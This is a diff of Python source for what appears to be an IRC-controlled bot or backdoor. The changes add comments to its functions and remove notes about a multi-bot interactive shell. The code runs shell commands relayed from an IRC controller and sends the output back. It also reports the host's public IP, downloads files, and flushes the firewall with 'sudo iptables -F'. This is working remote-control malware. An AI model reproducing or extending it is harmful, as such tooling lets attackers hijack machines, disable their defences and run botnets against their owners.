@@ -21,11 +21,11 @@ import subprocess as sub
 from sys import argv
 from random import randint
 
-def generateNick(os):
+def generateNick(os): #generates a nick for the server
 	rannum = str(randint(0, 9999))
 	return str(os[:3] + rannum)
 
-def execute(cmd):
+def execute(cmd): #execute shell commands
 	#handling a multi-word command
 	cmdList = []
 	if (cmd.find(" ") != -1):
@@ -56,7 +56,7 @@ def execute(cmd):
 		return lines
 
 #actually sending the data
-def sendData(data):
+def sendData(data): #send text back to the irc server
 	#sending multiple lines if it's a list
 	if type(data) is list:
 		for line in data:
@@ -87,35 +87,35 @@ def terminate(): #terminate program and send goodbye message
 	sendData("Oh no! We better find some cover.")
 	exit()
 
-def freeSpace():
+def freeSpace(): #tells how much free space there is
 	request = execute("df")
 	sendData(request)
 
-def uptime():
+def uptime(): #total uptime on the server
 	request = execute("uptime")
 	sendData(request)
 
-def version():
+def version(): #which kernel version
 	sendData(platform.release())
 
-def getIP():
+def getIP(): #gets the public IP address
 	my_ip = urllib2.urlopen('http://ip.42.pl/raw').read()
 	sendData(my_ip)
 
-def flushFirewall():
+def flushFirewall(): #flushes the firewall rules
 	os = platform.system().lower()
 	if (os == "linux"):
 		request = execute("sudo iptables -F")#flushing rules
 		sendData("Firewall rules have been flushed.")
 
-def checkFirewall():
+def checkFirewall(): #reports current firewall config
 	os = platform.system().lower()
 	if (os == "linux"):
 		sendData("Current Firewall Rules:")
 		request = execute("sudo iptables -L -n")
 		sendData(request)
 
-def download(cmd):
+def download(cmd): #file downloader
 	os = platform.system().lower()
 	if (os == "linux"):
 		if (cmd.count(" ") != 1):#make sure there is only 1 space
@@ -163,18 +163,6 @@ commands = {
 	"firewall" : checkFirewall,
 	"download" : download
 }
-
-#MAYBE have syntax like this '??botname: interactive' or '??botname: commands'
-	#interactive would be the interactive shell while commands would be just listen to 
-#or just allow one liners to bots like 'nick: command'
-#allow controller to tell singular bots or all bots to return output of command or success/failure only
-
-#interactive shell details - 
-#	'??bot1 bot2' or '??bot1' will enable interactive shell mode for the nicks given. Using 'all' as a nick will include all bots.
-#	You will be able to enter commands and receive input from each bot initiated in interactive shell mode until you enter
-#	'??finish' or you remove them from the interactive group. To remove one or more bots from the listening interactive shell
-#	group, use '??-bot1 bot2' or '??-bot1'. To add one or more bots to the group, use '??+bot1 bot2' or '??+bot1'. To change
-#	settings on bots in the group, use '???bot1 bot2' or '???bot1'. Changing settings still needs to be implemented.
 
 #function which parses the command and determines how to handle it
 def parseCommand(command):
